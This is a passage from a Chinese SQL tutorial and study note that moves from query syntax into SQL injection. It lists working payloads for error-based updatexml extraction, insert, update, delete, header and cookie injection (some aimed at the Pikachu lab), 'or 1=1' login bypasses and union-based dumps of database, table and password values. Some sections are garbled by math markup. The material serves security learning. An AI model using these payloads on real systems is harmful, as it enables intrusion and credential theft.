where name like ‘G_o_le’;&lt;br&gt;
 下面的 SQL 语句选取 name 以 “G”、“F” 或 “s” 开始的所有网站：&lt;br&gt;
select * from Websites&lt;br&gt;
where name regexp ‘&lt;sup class=&#34;footnote-ref&#34;&gt;&lt;a href=&#34;#fn1&#34; id=&#34;fnref1&#34;&gt;[1]&lt;/a&gt;&lt;/sup&gt;’;&lt;br&gt;
 下面的 SQL 语句选取 name 以 A 到 H 字母开头的网站：&lt;br&gt;
select * from Websites&lt;br&gt;
where name regexp ‘&lt;sup class=&#34;footnote-ref&#34;&gt;&lt;a href=&#34;#fn2&#34; id=&#34;fnref2&#34;&gt;[2]&lt;/a&gt;&lt;/sup&gt;’;&lt;br&gt;
 下面的 SQL 语句选取 name 不以 A 到 H 字母开头的网站：&lt;br&gt;
select * from Websites&lt;br&gt;
where name regexp ‘&lt;sup&gt;[&lt;/sup&gt;A-H]’;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;in 操作符&lt;br&gt;
 in 操作符允许您在 where 子句中规定多个值。&lt;br&gt;
语法:&lt;br&gt;
select column_name(s)&lt;br&gt;
from table_name&lt;br&gt;
where column_name in (value1,value2,…);&lt;br&gt;
 下面的 SQL 语句选取 name 为 “Google” 或 “菜鸟教程” 的所有网站：&lt;br&gt;
select * from Websites&lt;br&gt;
where name in (‘Google’,‘菜鸟教程’);&lt;/li&gt;
&lt;li&gt;between 操作符&lt;br&gt;
 between 操作符用于选取介于两个值之间的数据范围内的值。&lt;br&gt;
语法:&lt;br&gt;
select column_name(s)&lt;br&gt;
from table_name&lt;br&gt;
where column_name between value1 AND value2;&lt;br&gt;
 下面的 SQL 语句选取 alexa 介于 1 和 20 之间的所有网站：&lt;br&gt;
select * from Websites&lt;br&gt;
where alexa between 1 and 20;&lt;br&gt;
 如需显示不在上面实例范围内的网站，请使用 NOT BETWEEN：&lt;br&gt;
select * from Websites&lt;br&gt;
where alexa not between 1 and 20;&lt;/li&gt;
&lt;li&gt;别名&lt;br&gt;
通过使用 SQL，可以为表名称或列名称指定别名。&lt;br&gt;
语法：&lt;br&gt;
列：&lt;br&gt;
select column_name as alias_name&lt;br&gt;
from table_name;&lt;br&gt;
 表：&lt;br&gt;
select column_name(s)&lt;br&gt;
from table_name as alias_name;&lt;/li&gt;
&lt;li&gt;连接 (join)&lt;br&gt;
 join 用于把来自两个或多个表的行结合起来。&lt;/li&gt;
&lt;/ul&gt;
&lt;ol&gt;
&lt;li&gt;inner join：如果表中有至少一个匹配，则返回行&lt;br&gt;
在表中存在至少一个匹配时返回行。&lt;br&gt;
语法:&lt;br&gt;
select column_name(s)&lt;br&gt;
from table1&lt;br&gt;
inner join table2&lt;br&gt;
on table1.column_name=table2.column_name;&lt;br&gt;
 或：&lt;br&gt;
select column_name(s)&lt;br&gt;
from table1&lt;br&gt;
join table2&lt;br&gt;
on table1.column_name=table2.column_name;&lt;br&gt;
left join：即使右表中没有匹配，也从左表返回所有的行&lt;br&gt;
从左表（table1）返回所有的行，即使右表（table2）中没有匹配。如果右表中没有匹配，则结果为 NULL。&lt;br&gt;
语法&lt;br&gt;
 select column_name (s)&lt;br&gt;
from table1&lt;br&gt;
left join table2&lt;br&gt;
on table1.column_name=table2.column_name;&lt;br&gt;
 或：&lt;br&gt;
select column_name(s)&lt;br&gt;
from table1&lt;br&gt;
left outer  join table2&lt;br&gt;
on table1.column_name=table2.column_name;&lt;br&gt;
right join：即使左表中没有匹配，也从右表返回所有的行&lt;br&gt;
从右表（table2）返回所有的行，即使左表（table1）中没有匹配。如果左表中没有匹配，则结果为 NULL。&lt;br&gt;
语法&lt;br&gt;
 select column_name (s)&lt;br&gt;
from table1&lt;br&gt;
right join table2&lt;br&gt;
on table1.column_name=table2.column_name;&lt;br&gt;
 或：&lt;br&gt;
select column_name(s)&lt;br&gt;
from table1&lt;br&gt;
right outer join table2&lt;br&gt;
on table1.column_name=table2.column_name;&lt;br&gt;
full join：只要其中一个表中存在匹配，则返回行&lt;br&gt;
只要左表（table1）和右表（table2）其中一个表中存在匹配，则返回行.&lt;br&gt;
 关键字结合了 left join 和 right join 的结果。&lt;br&gt;
语法&lt;br&gt;
 select column_name (s)&lt;br&gt;
from table1&lt;br&gt;
full outer join table2&lt;br&gt;
on table1.column_name=table2.column_name;&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;union 操作符&lt;br&gt;
 union 操作符合并两个或多个 SELECT 语句的结果。&lt;br&gt;
注意: union 内部的每个 select 语句必须拥有相同数量的列。列也必须拥有相似的数据类型。同时，每个 SELECT 语句中的列的顺序必须相同。&lt;br&gt;
语法：&lt;br&gt;
select column_name(s) from table1&lt;br&gt;
union&lt;br&gt;
select column_name(s) from table2;&lt;br&gt;
 注释：默认地，union 操作符选取不同的值。如果允许重复的值，请使用 union all。&lt;/li&gt;
&lt;li&gt;select into 语句&lt;br&gt;
通过 SQL，您可以从一个表复制信息到另一个表。&lt;br&gt;
select into 语句从一个表复制数据，然后把数据插入到另一个新表中。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;&lt;span id=&#34;sql-注入&#34;&gt; SQL 注入&lt;/span&gt;&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;为什么存在 sql 注入&lt;/li&gt;
&lt;/ul&gt;
&lt;ol&gt;
&lt;li&gt;语言分类：解释型语言和编译型语言。&lt;br&gt;
解释型语言：是一种在运行时由一个运行时组件解释语言代码并执行其中包含指令的语言&lt;br&gt;
编译型语言：代码在生成时转化为机器指令，然后在运行时直接由使用该语言的计算机执行这些命令&lt;br&gt;
在解释型语言中，如果程序与用户进行交互。用户就可以构造特殊的输入来拼接到程序中执行，从而使得程序依据用户输入执行可能存在恶意行为的代码&lt;/li&gt;
&lt;li&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;可控变量，带入数据库查询，变量未存在过滤或过滤不严谨&lt;br&gt;
注入产生的原因是接受相关参数未经过滤直接带入数据库查询操作。&lt;br&gt;
SQL 注入：服务器端未严格校验客户端发送的数据，而导致服务端 SQL 语句被恶意修改并成功执行&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;会产生 SQL 注入原因：&lt;/li&gt;
&lt;/ul&gt;
&lt;ol&gt;
&lt;li&gt;代码对带入 SQL 语句的参数过滤不严格&lt;/li&gt;
&lt;li&gt;未启用框架的安全配置&lt;/li&gt;
&lt;li&gt;未使用框架安全的查询方法&lt;/li&gt;
&lt;li&gt;测试接口未删除&lt;/li&gt;
&lt;li&gt;未启用防火墙&lt;/li&gt;
&lt;li&gt;未使用其他安全的防护设备&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;SQL 注入危害：&lt;/li&gt;
&lt;/ul&gt;
&lt;ol&gt;
&lt;li&gt;登录功能：数据库信息泄露，数据库存放的用户隐私信息泄露&lt;/li&gt;
&lt;li&gt;搜索功能：网页篡改；网页被挂马，传播恶意软件；修改数据库一些字段的值，嵌入网马链接，进行挂马攻击&lt;/li&gt;
&lt;li&gt;详情页：数据库被恶意操作；数据库服务器被攻击；数据库系统管理员账户被篡改&lt;/li&gt;
&lt;li&gt;商品购买：服务器被远程控制&lt;br&gt;
总结：任何和数据库产生交互的地方都会存在注入&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;注入的一般步骤：&lt;br&gt;
(1) SQL 注入点探测。通过适当的分析应用程序可以判断什么地方存在 SQL 注入点。通常只要带有输入提交的动态网页并且动态网页访问数据库就可能存在 SQL 注入漏洞&lt;br&gt;
 (2) 收集后台数据库信息。由于不同的数据库注入方法、函数都不一样，所以在注入之前要先判断数据库类型。&lt;br&gt;
(3) 猜解用户名和密码。数据库中的表和字段命名一般都是有规律的，通过构造特殊的 SQL 语句在数据库中一次猜解出表名、字段名、字段数、用户名和密码。&lt;br&gt;
(4) 查找 Web 后台管理入口。WEB 后台管理通常不对普通用户开放，要找到后台管理的登录网址，可以利用 Web 目录扫描工具（如：wwwscan、AWVS）快速搜索到可能的登录地址，然后逐一尝试，便可以找到后台管理平台的登录网址。&lt;br&gt;
(5) 入侵和破坏。&lt;/li&gt;
&lt;li&gt;注入的分类&lt;br&gt;
按照请求方法分类：&lt;/li&gt;
&lt;/ul&gt;
&lt;ol&gt;
&lt;li&gt;GET 型注入&lt;/li&gt;
&lt;li&gt;POST 型注入&lt;br&gt;
按照数据类型分类：&lt;/li&gt;
&lt;li&gt;整型注入&lt;/li&gt;
&lt;li&gt;字符型注入&lt;br&gt;
其他类型：&lt;/li&gt;
&lt;li&gt;报错注入&lt;/li&gt;
&lt;li&gt;双注入&lt;/li&gt;
&lt;li&gt;时间盲注&lt;/li&gt;
&lt;li&gt;Cookie 注入&lt;/li&gt;
&lt;li&gt;User-Agent 注入&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;常用的系统函数&lt;/li&gt;
&lt;/ul&gt;
&lt;ol&gt;
&lt;li&gt;version ()-------MySQL 版本&lt;/li&gt;
&lt;li&gt;user ()--------- 数据库用户名&lt;/li&gt;
&lt;li&gt;database ()--------- 数据库名&lt;/li&gt;
&lt;li&gt;@@datadir-------- 数据库路径&lt;/li&gt;
&lt;li&gt;@@version_compile_os-------- 操作系统版本&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;字符串连接函数&lt;/li&gt;
&lt;/ul&gt;
&lt;ol&gt;
&lt;li&gt;concat (str1,str2,…)------- 没有分隔符的连接字符串&lt;/li&gt;
&lt;li&gt;concat_ws (separator,str1,str2,…)----- 含有分隔符的连接字符串&lt;/li&gt;
&lt;li&gt;group_concat (str1,str2,…)------ 连接一个组的所有字符串，并以逗号分隔每一条数据&lt;/li&gt;
&lt;/ol&gt;
&lt;h2&gt;&lt;span id=&#34;sql-注入的一般方法&#34;&gt; sql 注入的一般方法&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;(1) 联合查询 union 注入：&lt;br&gt;
使用联合查询进行注入的前提是我们要进行注入的页面必须有显示位。&lt;br&gt;
所谓联合查询注入即是使用 union 合并两个或多个 SELECT 语句的结果集，所以两个及以上的 select 必须有相同列、且各列的数据类型也都相同，同时，每条 SELECT 语句中的列的顺序必须相同。联合查询可先在链接最后添加 order by X 基于随意数字的注入，根据页面的返回结果来判断站点中的字段数目。&lt;br&gt;
查询的字段必须等于主查询的字段，这个时候可以在 SQL 语句后面加 order by 进行排序，通过这个办法可以判断主查询的字段。&lt;br&gt;
(2) information_schema 注入：&lt;br&gt;
information_schema 数据库是 MySQL5.0 系统自带的数据库。其中保存着关于 MySQL 服务器所维护的所有其他数据库的信息。&lt;br&gt;
通过 information_schema 注入，我们可以将整个数据库内容全部窃取出来。&lt;br&gt;
(3) 基于报错信息注入:&lt;br&gt;
 此方法是在页面没有显示位，但是 echomysql_error (); 函数，在前端输出了错误信息的时候方能使用。&lt;br&gt;
优点是注入速度快，缺点是语句较为复杂，而且只能用 limit 依次进行猜解。总体来说，报错注入其实是一种公式化的注入方法，主要用于在页面中没有显示位，但是用 echomysql_error (); 输出了错误信息时使用。常见的 select/insert/update/delete 注入都可以使用报错方式来获取信息。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;三个常用的用来报错的函数&lt;br&gt;
 updatexml（）: 函数是 MYSQL 对 XML 文档数据进行查询和修改的 XPATH 函数&lt;br&gt;
 extractvalue（） : 函数也是 MYSQL 对 XML 文档数据进行查询的 XPATH 函数.&lt;br&gt;
floor（）: MYSQL 中用来取整的函数.&lt;/li&gt;
&lt;li&gt;基于报错的信息获取：&lt;br&gt;
updatexml (XML_document, XPath_string, new_value);&lt;br&gt;
 第一个参数：XML_document 是 String 格式，为 XML 文档对象的名称，文中为 Doc&lt;br&gt;
 第二个参数：XPath_string (Xpath 格式的字符串) ，如果不了解 Xpath 语法，可以在网上查找教程。&lt;br&gt;
第三个参数：new_value，String 格式，替换查找到的符合条件的数据&lt;br&gt;
 k’ and updatexml (1,concat (0x7e,(SELECT @@version),0x7e),1) #  爆数据库版本信息&lt;br&gt;
 k’ and updatexml (1,concat (0x7e,(SELECT user ()),0x7e),1)#  爆数据库当前用户&lt;br&gt;
 k’ and updatexml (1,concat (0x7e,(SELECT database ()),0x7e),1) #  爆数据库&lt;br&gt;
 k’ and updatexml (1,concat (0x7e,(select table_name from information_schema.tables where table_schema=‘数据库名’limit 0,1)),0)#，但是反馈回的错误表示只能显示一行，所以采用 limit 来一行一行显示  爆表名&lt;br&gt;
 k’ and updatexml (1,concat (0x7e,(select column_name from information_schema.columns where table_name=‘users’limit 2,1)),0)#  爆字段&lt;br&gt;
 k’ and updatexml (1,concat (0x7e,(select password from users limit 0,1)),0)#  爆值&lt;br&gt;
 (4) insert 注入、update 注入 、dalete 注入 、Http Header 注入 、Cookie 注入&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;1、insert 注入：注册的信息，没有经过过滤直接带到数据库中，导致 insert 注入。&lt;br&gt;
注入方法 payload：a’ or updatexml (1,concat (0x7e,(命令)),0) or’&lt;br&gt;
①. 爆表名&lt;br&gt;
 a’or updatexml (1,concat (0x7e,(select table_name from information_schema.tables where table_schema=‘pikachu’ limit 0,1)),0) or’&lt;br&gt;
②. 爆列名&lt;br&gt;
 a’ or updatexml (1,concat (0x7e,(select column_name from   information_schema.columns where table_name=‘users’limit 2,1)),0) or’&lt;br&gt;
③. 爆内容&lt;br&gt;
 a’ or updatexml (1,concat (0x7e,(select password from users limit 0,1)),0) or’等同于&lt;br&gt;
 a’ or updatexml (1,concat (0x7e,(select password from users limit 0,1)),0) or ‘1’=‘1’’&lt;/p&gt;
&lt;p&gt;2、update 注入：用户登陆端，没有经过过滤直接带到数据库中，导致 update 注入。&lt;br&gt;
a’ or updatexml(0,concat(0x7e,(database())),0) or’&lt;/p&gt;
&lt;p&gt;3、dalete 注入：应用于前后端发贴、留言、用户等相关删除操作时抓包。&lt;br&gt;
delete from message where id=56 or updatexml(2,concat(0x7e,(database())),0)&lt;/p&gt;
&lt;p&gt;4、Http Header 注入：数据库直接获取了前端的头信息没有做任何的处理导致注入。&lt;br&gt;
在 User-Agent 输入 Mozilla &#39;or updatexml (1,concat (0x7e,database ()),0) or ’&lt;/p&gt;
&lt;p&gt;5、Cookie 注入：后端获取 Cookie 直接在数据库中进行拼接，那这也是一个 SQL 注入点。&lt;br&gt;
注入方法 ：在 ant [uname]=admin 后添加一个’观察反馈的 MYSQL 的语法报错，发现了存在 SQL 注入漏洞后，再插入 &#39;and updatexml (1,concat (0x7e,database ()),0)#&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;SQL 注入总结：&lt;/li&gt;
&lt;/ul&gt;
&lt;ol&gt;
&lt;li&gt;判断是否注入 (是否严格校验)&lt;br&gt;
(1) 可控参数 (id) 能否影响页面显示&lt;br&gt;
 (2) 输入的 SQL 语句是否能报错 (能通过数据库报错，看到数据库一些语句痕迹)(select username,password from user where id = ?’ ) 后面单引号或者双引号&lt;br&gt;
通过在 URL 中修改对应的 id 值，值为正常数字、大数字、字符 (单引号、双引号、双单引号、括号)、反斜杠 \ 来探测 URL 中是否存在注入点&lt;br&gt;
 (3) 输入的 SQL 语句能否不报错 (我们的语句能够成功闭合) (select username,password from user where id = ‘?’ #‘limite 0,1’)&lt;/li&gt;
&lt;li&gt;什么类型的注入&lt;/li&gt;
&lt;li&gt;语句能否被恶意修改 (select username,password from user where id = ‘?’ and 0 #)&lt;/li&gt;
&lt;li&gt;是否能够成功执行&lt;/li&gt;
&lt;li&gt;获取我们想要的注入&lt;br&gt;
数据库 -&amp;gt; 表 -&amp;gt; 字段 -&amp;gt; 值&lt;br&gt;
抓包找出万能密码  (找出具体是哪种后台语言，确定万能密码)&lt;br&gt;
 CMS 逻辑&lt;br&gt;
 index.php 首页展示内容，具有文章列表 (链接具有文章 id)，article.php 文章详细页，URL 中 article.php?id = 文章 id 读取 id 文章&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;注入提交方式 (get post cookie)&lt;br&gt;
 ASP：request （全部接受）、request.querystring （接受 get）、request.form （接受 post）、 request.cookie cookie （接受 cookie）&lt;br&gt;
PHP: &lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math xmlns=&#34;http://www.w3.org/1998/Math/MathML&#34;&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;msub&gt;&lt;mrow&gt;&lt;/mrow&gt;&lt;mi&gt;R&lt;/mi&gt;&lt;/msub&gt;&lt;mi&gt;E&lt;/mi&gt;&lt;mi&gt;Q&lt;/mi&gt;&lt;mi&gt;U&lt;/mi&gt;&lt;mi&gt;E&lt;/mi&gt;&lt;mi&gt;S&lt;/mi&gt;&lt;mi&gt;T&lt;/mi&gt;&lt;mtext&gt;（全部接受）、&lt;/mtext&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;_REQUEST（全部接受）、&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.8777699999999999em;vertical-align:-0.19444em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.32833099999999993em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mathnormal mtight&#34; style=&#34;margin-right:0.00773em;&#34;&gt;R&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.05764em;&#34;&gt;E&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;Q&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.10903em;&#34;&gt;U&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.05764em;&#34;&gt;E&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.05764em;&#34;&gt;S&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.13889em;&#34;&gt;T&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;（&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;全&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;部&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;接&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;受&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;）&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;、&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;_GET（接受 get）、 &lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math xmlns=&#34;http://www.w3.org/1998/Math/MathML&#34;&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;msub&gt;&lt;mrow&gt;&lt;/mrow&gt;&lt;mi&gt;P&lt;/mi&gt;&lt;/msub&gt;&lt;mi&gt;O&lt;/mi&gt;&lt;mi&gt;S&lt;/mi&gt;&lt;mi&gt;T&lt;/mi&gt;&lt;mtext&gt;（接受&lt;/mtext&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mi&gt;o&lt;/mi&gt;&lt;mi&gt;s&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mtext&gt;）、&lt;/mtext&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;_POST （接受post）、&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.8777699999999999em;vertical-align:-0.19444em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.32833099999999993em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mathnormal mtight&#34; style=&#34;margin-right:0.13889em;&#34;&gt;P&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.02778em;&#34;&gt;O&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.05764em;&#34;&gt;S&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.13889em;&#34;&gt;T&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;（&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;接&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;受&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;o&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;）&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;、&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;_COOKIE（接受 cookie）&lt;/li&gt;
&lt;li&gt;一般用于尝试的语句 (也就是根据 sql 语句，运用逻辑判断反馈结果得到判断类型)&lt;br&gt;
 Ps:–+ 可以用 #替换，url 提交过程中 Url 编码后的 #为 %23&lt;br&gt;
or 1=1–+&lt;br&gt;
&#39;or 1=1–+&lt;br&gt;
&amp;quot;or 1=1–+&lt;br&gt;
)or 1=1–+&lt;br&gt;
&#39;)or 1=1–+&lt;br&gt;
&amp;quot;) or 1=1–+&lt;br&gt;
&amp;quot;))or 1=1–+&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;&lt;span id=&#34;不再显示错误的盲注&#34;&gt; 不再显示错误的盲注&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;Blind sql (盲注) 是注入攻击的一种，向数据库发送 true 或 false 这样的问题，并根据应用程序返回的信息判断结果，这种攻击的出现是因为应用程序配置为只显示常规错误，但并没有解决 SQL 注入存在的代码问题&lt;/p&gt;
&lt;h2&gt;&lt;span id=&#34;登录型&#34;&gt; 登录型&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;登录 SQL 语句：select * from admin where username = &#39; 用户输入的用户名’and password = ‘用户输入的密码’’&lt;br&gt;
登录 SQL 语句：select * from admin where username = &#39; 用户输入的用户名‘ and password =‘用户输入的密码’&lt;br&gt;
用户输入的内容可由用户自行控制，例如可以输入 数字’or 1 = 1 -- 空格 (%20 也表示空格或者 + 或者 #)&lt;br&gt;
 SQL 语句：select * from admin where username =‘数字’ or 1=1 --&#39;and password =‘用户输入的密码’&lt;br&gt;
其中 or 1=1 永远为真，–注释后面内容不再执行，因此 SQL 语句执行会返回 admin 表中的所有内容&lt;/p&gt;
&lt;h2&gt;&lt;span id=&#34;数字型注入&#34;&gt; 数字型注入&lt;/span&gt;&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;概念&lt;br&gt;
当输入的参数为整型时，如 ID、年龄、页码等，如果存在注入漏洞，则可以认为是数字型注入。这种数字型注入最多出现在 ASP、PHP 等弱类型语言中，弱类型语言会自动推导变量类型，例如，参数 id=8，PHP 会自动推导变量 id 的数据类型为 int 类型，那么 id=8 and 1=1，则会推导为 string 类型，这是弱类型语言的特性。而对于 Java、C# 这类强类型语言，如果试图把一个字符串转换为 int 类型，则会抛出异常，无法继续执行。所以，强类型的语言很少存在数字型注入漏洞。&lt;br&gt;
数字型：select * from table where id =$id&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;判断：&lt;br&gt;
这种类型可以使用经典的 and 1=1 和 and 1=2 来判断：&lt;br&gt;
select * from &amp;lt;表名&amp;gt; where id = 1 and 1=1   (true)&lt;br&gt;
 select * from &amp;lt;表名&amp;gt; where id = 1 and 1=2   (false)&lt;br&gt;
 字符型：&lt;br&gt;
select * from &amp;lt;表名&amp;gt; where id = ‘1 and 1=1’&lt;br&gt;
select * from &amp;lt;表名&amp;gt; where id = ‘1 and 1=2’&lt;br&gt;
不会进行逻辑判断 (转化为字符型语句，单引号里面就是一团内容)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;数字 or 1=1&lt;br&gt;
 举例：&lt;br&gt;
select * from table where id = 1 or 1 = 1&lt;br&gt;
 永为真&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;步骤&lt;/p&gt;
&lt;p&gt;(1) 利用 1 order by 判断字段数&lt;br&gt;
 (2) 显位：联合查询查看显示位&lt;br&gt;
 1 union select 1,2 #&lt;br&gt;
(3) 爆库：显示出数据库名字&lt;br&gt;
 1 union select 1,group_concat (schema_name) from (information_schema.schemata)#&lt;br&gt;
或  所有数据库&lt;br&gt;
 1 union select 1,database ()#  当前数据库&lt;br&gt;
 (4) 爆表：利用 union select 联合查询，获取表名&lt;br&gt;
 1 union select 1,group_concat (table_name) from information_schema.tables where table_schema=database ()#    当前数据库的表&lt;br&gt;
 1 union select1,group_concat (table_name) from (information_schema.tables) where table_schema=‘数据库名字’ #  指定名称数据库的表&lt;br&gt;
 (5) 爆列：利用 union select 联合查询，获取字段名&lt;br&gt;
 1 union select 1,group_concat (column_name) from information_schema.columns where table_schema=database () and table_name=‘表名’ #  当前数据库的指定表名&lt;br&gt;
 1 union select 1,group_concat (column_name) from (information_schema.columns) where table_name=‘表名’ #  在所有数据库中指定一个表名&lt;br&gt;
 (6) 爆值：利用 union select 联合查询，获取字段值&lt;br&gt;
 1 union select 1,group_concat (concat_ws (表名对应的字段名)) from (表名)      在当前数据库中的相应表名的字段值&lt;br&gt;
或&lt;br&gt;
 1 union select 1,group_concat (表名对应的字段名) from (数据库。表名)    在所有数据库中对应表名的字段值&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;&lt;span id=&#34;字符型注入&#34;&gt; 字符型注入&lt;/span&gt;&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;概念&lt;br&gt;
当输入参数为字符串时，称为字符型。数字型与字符型注入最大的区别在于：数字型不需要单引号闭合，而字符串类型一般要使用单引号来闭合。&lt;br&gt;
字符型：select * from table where id=’$id’&lt;/li&gt;
&lt;li&gt;判断：&lt;/li&gt;
&lt;/ul&gt;
&lt;ol&gt;
&lt;li&gt;这种类型我们同样可以使用’ and ‘1’=‘1 和 x’ and ‘1’ = ‘2 来判断：(得知道 username)&lt;br&gt;
 select * from &amp;lt;表名&amp;gt; where id = ‘x’ and ‘1’=‘1’  (true)&lt;br&gt;
 select * from &amp;lt;表名&amp;gt; where id = ‘x’ and ‘1’=‘2’  (false)&lt;br&gt;
select name.passwd from users where username=’  ’ and password=‘   ’&lt;/li&gt;
&lt;li&gt;内容’ or ‘1’=‘1’# 和内容’ or ‘1’=‘2’#&lt;br&gt;
select name.passwd from users where username=’ 内容’ or ‘1’=‘1 ’ and password=‘ 内容  ’&lt;br&gt;
select name.passwd from users where username=’ 内容’ or ‘1’=‘1’# ’ and password=‘ 内容  ’   (true)&lt;br&gt;
 select name.passwd from users where username=’ 内容’ or ‘1’=‘2’# ’ and password=‘ 内容  ’(false)&lt;/li&gt;
&lt;li&gt;内容’ or ‘1’=‘1 和 内容’ or ‘1’=‘2    (得知道 username)&lt;br&gt;
 select name.passwd from users where username=’ 内容’ or ‘1’=‘1 ’ and password=‘ 内容  ’&lt;br&gt;
and 优先级大于 or&lt;br&gt;
（select name.passwd from users where username=‘admin’） or（ ‘1’=‘1’ and password=‘12345’）&lt;br&gt;
所以这里有猜测成分，内容必须为真&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;内容’ or 1=1#&lt;br&gt;
